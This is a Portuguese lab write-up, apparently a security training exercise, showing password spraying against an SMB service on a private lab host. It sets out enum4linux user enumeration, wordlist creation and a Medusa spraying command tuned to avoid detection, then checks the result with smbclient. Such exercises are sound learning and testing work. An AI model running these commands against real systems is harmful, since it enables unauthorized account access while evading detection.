## 🖧 Passo a Passo do Teste em SMB com Password Spraying

Abaixo estão as etapas realizadas para simular um cenário corporativo em que um serviço **SMB mal configurado** foi identificado e submetido a um teste de **password spraying**, técnica utilizada para tentar poucas senhas em vários usuários e reduzir a chance de detecção.

### 1. Cenário simulado

Neste teste foi considerado o seguinte cenário:

- Um serviço SMB foi identificado em um ambiente interno  
- O objetivo era validar se existiam credenciais fracas  
- Para evitar bloqueios ou alertas, foi utilizada a técnica de **password spraying**

**Objetivo:**  
Simular um ataque mais discreto em ambiente corporativo.

---

### 2. Enumerar usuários existentes

Primeiro foi realizada a enumeração de usuários para identificar contas válidas no sistema.

```bash
enum4linux -a 192.168.56.103 | tee enum4_output.txt
```

**Objetivo:**  
Coletar informações sobre usuários existentes antes do ataque.

---

### 3. Analisar o arquivo de enumeração

O resultado foi salvo em arquivo para facilitar a análise.

```bash
less enum4_output.txt
```

**Objetivo:**  
Localizar usuários válidos para montar a wordlist.

---

### 4. Criar wordlists para o teste

Com base na enumeração, foram criadas listas de usuários e senhas prováveis.

#### Lista de usuários

```bash
echo -e 'user\nservice\nmsfadmin' > smb_users.txt
```

#### Lista de senhas

```bash
echo -e 'password\n123456\nmsfadmin' > senhas_spray.txt
```

**Objetivo:**  
Preparar credenciais para o teste de password spraying.

---

### 5. Executar o ataque com Medusa

Com as wordlists preparadas, foi executado o teste automatizado no serviço SMB.

```bash
medusa -h 192.168.56.103 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```

**Parâmetros utilizados:**

- `-h` → Host alvo  
- `-U` → Lista de usuários  
- `-P` → Lista de senhas  
- `-M smbnt` → Módulo SMB  
- `-t 2` → Poucas conexões simultâneas por host  
- `-T 50` → Intervalo entre tentativas para reduzir detecção  

---

### 6. Validar credenciais encontradas

Após a identificação das credenciais válidas, foi realizado o teste manual.

```bash
smbclient -L //192.168.56.103 -U msfadmin
```

**Objetivo:**  
Confirmar que o login encontrado pelo Medusa funciona corretamente.

---

## ✅ Resultado

O teste demonstrou que o serviço **SMB** permitia autenticação com credenciais fracas em um ambiente vulnerável.

A combinação da enumeração com **enum4linux** e do ataque de **password spraying** com o Medusa permitiu identificar contas válidas de forma mais discreta, simulando um cenário realista de auditoria ofensiva.

---
